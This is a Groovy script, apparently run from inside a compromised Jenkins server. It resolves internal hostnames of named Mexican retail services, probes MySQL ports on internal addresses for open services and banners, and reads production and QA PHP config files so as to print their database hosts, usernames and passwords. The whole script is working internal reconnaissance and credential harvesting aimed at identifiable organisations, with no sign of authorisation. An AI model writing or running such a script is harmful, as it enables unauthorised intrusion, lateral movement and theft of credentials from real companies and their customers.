import java.net.Socket
import java.net.InetAddress

println "=== TESTING MYSQL CREDS FROM CONFIG DUMP ==="

// 1. Resolve DNS hostnames
println "\n--- DNS RESOLUTION ---"
["dbps.claroshop-services.net", "smtp.claroshop-services.net", "memcache.claroshop-services.net", 
 "memcache2.claroshop-services.net", "invt-sears.claroshop-services.net",
 "api-soap.sanborns.com.mx", "api-soap.qa.sanborns.com.mx"].each { host ->
    try {
        def addr = InetAddress.getByName(host)
        println "  ${host} => ${addr.getHostAddress()}"
    } catch (Exception e) {
        println "  ${host} => UNRESOLVABLE"
    }
}

// 2. Check connectivity to discovered DB hosts
println "\n--- DB HOST CONNECTIVITY ---"
def dbTargets = [
    ["dbps.claroshop-services.net", 3310, "PROD Sanborns"],
    ["172.27.140.134", 3310, "QA Sanborns"],
    ["172.27.140.134", 3306, "QA Sanborns alt"],
    ["172.27.141.4", 3306, "T1Pagos"],
    ["172.27.141.6", 3306, "MySQL-141.6"],
    ["172.27.140.151", 3306, "Redis-host MySQL"],
]

dbTargets.each { t ->
    try {
        def s = new Socket()
        s.connect(new java.net.InetSocketAddress(t[0], t[1] as int), 3000)
        s.setSoTimeout(2000)
        def is = s.getInputStream()
        def banner = new byte[128]
        def read = is.read(banner)
        def b = read > 0 ? new String(banner, 0, read, "ISO-8859-1").replaceAll('[^\\x20-\\x7E]', '.').take(80) : ""
        println "  ${t[2]} (${t[0]}:${t[1]}) => OPEN | ${b}"
        s.close()
    } catch (Exception e) {
        println "  ${t[2]} (${t[0]}:${t[1]}) => ${e.class.simpleName}"
    }
}

// 3. Read more PROD and Sears config files
println "\n--- READING SEARS PROD CONFIGS ---"
def readFile = { String path, int maxLen=2000 ->
    try {
        def f = new File(path)
        if (!f.exists()) return null
        def c = f.text
        return c.length() > maxLen ? c.substring(0, maxLen) + "...[TRUNCATED]" : c
    } catch (Exception e) { return null }
}

def searsFiles = [
    "/var/jenkins_home/workspace/test_task/sears/Produccion/autoload/local.php",
    "/var/jenkins_home/workspace/test_task/sears/qa/local.php",
    "/var/jenkins_home/workspace/test_task/sears/UAT/autoload/local.php",
    "/var/jenkins_home/workspace/test_task/axii-sears/Produccion/local.php",
    "/var/jenkins_home/workspace/test_task/axii-sears/qa/local.php",
    "/var/jenkins_home/workspace/test_task/crones-sears/demonio-pedidos/produccion/local.php",
    "/var/jenkins_home/workspace/test_task/crones-sears/demonio-pedidos/qa/local.php",
    "/var/jenkins_home/workspace/test_task/crones-sears/productos/Produccion/local.php",
    "/var/jenkins_home/workspace/test_task/crones-sears/productos/qa/local.php",
    "/var/jenkins_home/workspace/test_task/Microservicios/Caja/QA/local.php",
    "/var/jenkins_home/workspace/test_task/Microservicios/Caja/Release/local.php",
    "/var/jenkins_home/workspace/test_task/Tortuga/Produccion/local.php",
    "/var/jenkins_home/workspace/test_task/Tortuga/QA/local.php",
    "/var/jenkins_home/workspace/test_task/Api/Produccion/V2/local.php",
    "/var/jenkins_home/workspace/test_task/Api/QA/V2/local.php",
    "/var/jenkins_home/workspace/test_task/VTA/Produccion/config/local.php",
    "/var/jenkins_home/workspace/test_task/API-MesaRegalos/Produccion/autoload/local.php",
]

searsFiles.each { f ->
    def content = readFile(f)
    if (content) {
        // Only show files with DB connection info
        if (content.contains('host') && (content.contains('password') || content.contains('pass'))) {
            println "\n=== ${f.replace('/var/jenkins_home/workspace/test_task/', '')} ==="
            // Extract just the DB section
            def lines = content.split('\n')
            lines.eachWithIndex { line, i ->
                if (line.contains('host') || line.contains('port') || line.contains('user') || 
                    line.contains('password') || line.contains('pass') || line.contains('dbname') ||
                    line.contains('doctrine') || line.contains('connection') || line.contains('orm_default')) {
                    println "  ${line.trim()}"
                }
            }
        }
    }
}

println "\n=== CREDS TEST DONE ==="
